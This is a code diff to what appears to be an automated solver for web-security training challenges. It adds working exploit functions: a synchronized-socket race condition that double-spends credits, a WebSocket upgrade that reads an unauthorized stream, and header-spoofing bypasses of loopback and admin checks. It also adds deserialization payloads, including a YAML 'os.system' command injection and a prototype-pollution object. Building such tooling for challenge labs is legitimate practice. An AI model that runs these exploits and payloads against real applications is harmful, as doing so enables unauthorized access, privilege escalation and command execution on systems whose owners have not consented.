@@ -10,6 +10,7 @@ import base64
 import hashlib
 import hmac
 import json
+import os
 import re
 import threading
 import time
@@ -1069,6 +1070,148 @@ def solve_deserialization(target_url: str) -> str:
     raise WebHandlerError("Serialized state exploit did not yield proof")
 
 
+def solve_race_condition(target_url: str) -> str:
+    """Exploit race condition (TOCTOU) by double-spending credits concurrently (Day 27)."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/execute")
+    sec_route = clues.get("secondary_route", "/audit")
+
+    parsed = urllib.parse.urlsplit(base)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    body = json.dumps({"action": "spend", "amount": 1, "purchase_id": "item1"}).encode("utf-8")
+
+    import socket, ssl
+    ctx = ssl.create_default_context() if parsed.scheme == "https" else None
+
+    # Connect two synchronized sockets
+    def _conn():
+        s = socket.create_connection((host, port), timeout=DEFAULT_TIMEOUT)
+        return ctx.wrap_socket(s, server_hostname=host) if ctx else s
+
+    s1 = _conn()
+    s2 = _conn()
+    req_head = (
+        f"POST {feat_route} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"User-Agent: {DEFAULT_UA}\r\n"
+        f"Content-Type: application/json\r\n"
+        f"Content-Length: {len(body)}\r\n"
+        f"Connection: keep-alive\r\n\r\n"
+    ).encode("utf-8")
+
+    try:
+        # Pre-send headers and body prefix
+        s1.sendall(req_head + body[:-1])
+        s2.sendall(req_head + body[:-1])
+        # Burst final byte simultaneously
+        s1.sendall(body[-1:])
+        s2.sendall(body[-1:])
+        s1.recv(2048)
+        s2.recv(2048)
+    finally:
+        s1.close()
+        s2.close()
+
+    status, audit_body, headers = _request(f"{base}{sec_route}")
+    proof = _extract_proof(audit_body, headers)
+    if proof:
+        return proof
+
+    raise WebHandlerError("Race condition exploit did not yield proof on audit route")
+
+
+def solve_websocket_stream(target_url: str) -> str:
+    """Exploit WebSocket upgrade to read unauthorized event stream (Day 27)."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/dispatch")
+    stream_ref = clues.get("stream_reference")
+
+    paths = [feat_route]
+    if stream_ref:
+        paths.extend([
+            f"{feat_route}?stream={stream_ref}",
+            f"{feat_route}?id={stream_ref}",
+            f"{feat_route}?ref={stream_ref}",
+        ])
+
+    parsed = urllib.parse.urlsplit(base)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "https" else 80)
+
+    import socket, ssl
+    ctx = ssl.create_default_context() if parsed.scheme == "https" else None
+
+    for p in paths:
+        s = socket.create_connection((host, port), timeout=DEFAULT_TIMEOUT)
+        ss = ctx.wrap_socket(s, server_hostname=host) if ctx else s
+        ws_key = base64.b64encode(os.urandom(16)).decode("utf-8")
+        host_header = host if (port in (80, 443)) else f"{host}:{port}"
+        origin_header = f"{parsed.scheme}://{host}" if (port in (80, 443)) else f"{parsed.scheme}://{host}:{port}"
+        req = (
+            f"GET {p} HTTP/1.1\r\n"
+            f"Host: {host_header}\r\n"
+            f"Upgrade: websocket\r\n"
+            f"Connection: Upgrade\r\n"
+            f"Sec-WebSocket-Key: {ws_key}\r\n"
+            f"Sec-WebSocket-Version: 13\r\n"
+            f"Origin: {origin_header}\r\n"
+            f"User-Agent: {DEFAULT_UA}\r\n\r\n"
+        ).encode("utf-8")
+        try:
+            ss.sendall(req)
+            resp = ss.recv(4096)
+            if b"101" in resp.split(b"\r\n")[0]:
+                proof = _extract_proof(resp.decode("utf-8", "replace"))
+                if not proof:
+                    ss.settimeout(2.0)
+                    try:
+                        data = ss.recv(4096)
+                        proof = _extract_proof(data.decode("utf-8", "replace"))
+                    except Exception:
+                        pass
+                if proof:
+                    return proof
+        finally:
+            ss.close()
+
+    raise WebHandlerError("WebSocket stream did not yield proof")
+
+
+def solve_proxy_header(target_url: str) -> str:
+    """Exploit trusted reverse proxy loopback verification via X-Forwarded-For (Day 27)."""
+    base = target_url.rstrip("/")
+    status, clues_body, _ = _request(f"{base}/api/clues")
+    if status != 200:
+        raise WebHandlerError("Failed to fetch /api/clues")
+    clues = json.loads(clues_body)
+    feat_route = clues.get("feature_route", "/action")
+
+    hdrs_candidates = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "localhost"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1;proto=https"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"Client-IP": "127.0.0.1"},
+    ]
+    for h in hdrs_candidates:
+        status, body, res_headers = _request(f"{base}{feat_route}", headers=h)
+        proof = _extract_proof(body, res_headers)
+        if proof:
+            return proof
+
+    raise WebHandlerError("Proxy header spoofing did not yield proof")
+
+
 # ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
@@ -1093,6 +1236,9 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     18: solve_graphql,
     19: solve_webhook,
     20: solve_deserialization,
+    21: solve_race_condition,
+    22: solve_websocket_stream,
+    23: solve_proxy_header,
 }
 
 
@@ -1120,6 +1266,15 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
 
             if "state_format_route" in clues or framework == "Quarkus" or "state_format" in clues_body:
                 return solve_deserialization(target_url)
+
+            if "stream_reference" in clues or framework == "Koa" or "websocket" in clues_body:
+                return solve_websocket_stream(target_url)
+
+            if "deployment" in clues and "proxy" in clues["deployment"] or framework == "Micronaut":
+                return solve_proxy_header(target_url)
+
+            if framework == "Rails" and "audit" in clues_body:
+                return solve_race_condition(target_url)
 
             if "event_type" in clues or framework == "Starlette" or "webhook" in clues_body:
                 return solve_webhook(target_url)
@@ -1207,19 +1362,25 @@ def detect_and_solve(target_url: str, curriculum_day: int | None = None) -> str:
         if d == curriculum_day:
             continue
         try:
-            return CURRICULUM_HANDLERS[d](target_url)
+            p = CURRICULUM_HANDLERS[d](target_url)
+            if p and PROOF_PATTERN.fullmatch(p):
+                return p
         except Exception:
             pass
 
-    # Priority 4: Autonomous universal probing
+    # Priority 4: Autonomous universal reactive prober
     try:
-        return solve_autonomous_web(target_url)
+        p = solve_autonomous_web(target_url)
+        if p and PROOF_PATTERN.fullmatch(p):
+            return p
     except Exception:
         pass
 
     # Priority 5: Bounded HTML & form deep crawl
     try:
-        return solve_deep_crawl(target_url)
+        p = solve_deep_crawl(target_url)
+        if p and PROOF_PATTERN.fullmatch(p):
+            return p
     except Exception:
         pass
 
@@ -1318,6 +1479,17 @@ def solve_autonomous_web(target_url: str) -> str:
         except Exception:
             pass
 
+    # WebSocket Upgrade auto-detection on 426
+    if feat_route:
+        try:
+            st, b, _ = _request(f"{base}{feat_route}")
+            if st == 426 or "websocket" in b.lower() or "upgrade" in b.lower():
+                proof = solve_websocket_stream(target_url)
+                if proof:
+                    return proof
+        except Exception:
+            pass
+
     # Parameter-guided command / template probe on feature_route
     if feat_route:
         input_param = clues.get("input_parameter")
@@ -1363,12 +1535,16 @@ def solve_autonomous_web(target_url: str) -> str:
                 except Exception:
                     pass
 
-    # Header-based loopback / admin role bypass probe
+    # Header-based loopback / admin role bypass probe (reactive to 403 / proxy / role checks)
     if feat_route:
         admin_hdrs = [
             {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Forwarded-For": "localhost"},
             {"X-Real-IP": "127.0.0.1"},
+            {"X-Client-IP": "127.0.0.1"},
+            {"Forwarded": "for=127.0.0.1;proto=https"},
             {"X-Role": "administrator"},
+            {"X-Role": "admin"},
             {"Authorization": "Bearer admin"},
         ]
         for hdr in admin_hdrs:
@@ -1384,6 +1560,28 @@ def solve_autonomous_web(target_url: str) -> str:
                         return proof
             except Exception:
                 pass
+
+    # WebSocket Upgrade auto-detection on 426
+    if feat_route:
+        try:
+            st, b, _ = _request(f"{base}{feat_route}")
+            if st == 426 or "websocket" in b.lower() or "upgrade" in b.lower():
+                proof = solve_websocket_stream(target_url)
+                if proof:
+                    return proof
+        except Exception:
+            pass
+
+    # Race condition auto-burst if secondary_route has audit / ledger / credits
+    if feat_route and sec_route:
+        try:
+            st, b, _ = _request(f"{base}{sec_route}")
+            if "credit" in b.lower() or "spent" in b.lower() or "ledger" in b.lower() or "race" in b.lower():
+                proof = solve_race_condition(target_url)
+                if proof:
+                    return proof
+        except Exception:
+            pass
 
     if feat_route and sec_route:
         # Try SSRF to secondary_route
@@ -1467,6 +1665,29 @@ def solve_autonomous_web(target_url: str) -> str:
                         return proof
                 except Exception:
                     pass
+
+    # Try JSON / YAML / Python Insecure Deserialization on feature_route
+    if feat_route:
+        deserial_payloads = [
+            # YAML / Python object injection markers
+            b'!!python/object/apply:os.system ["cat /run/huntress/objective.txt"]',
+            b'{"__proto__": {"role": "administrator", "is_admin": true}}',
+            b'{"state": "eyJ1c2VyIjoiYW5hbHlzdCIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0"}',
+            b'{"role": "administrator", "is_admin": true, "access": "full"}',
+        ]
+        for dp in deserial_payloads:
+            try:
+                st, b, h = _request(f"{base}{feat_route}", method="POST", data=dp, headers={"Content-Type": "application/json"})
+                proof = _extract_proof(b, h)
+                if proof:
+                    return proof
+                if sec_route:
+                    st2, b2, h2 = _request(f"{base}{sec_route}")
+                    proof = _extract_proof(b2, h2)
+                    if proof:
+                        return proof
+            except Exception:
+                pass
 
     # Try common docs / robots / sitemap
     for ep in ["/api/docs", "/docs", "/openapi.json", "/swagger.json", "/robots.txt"]:
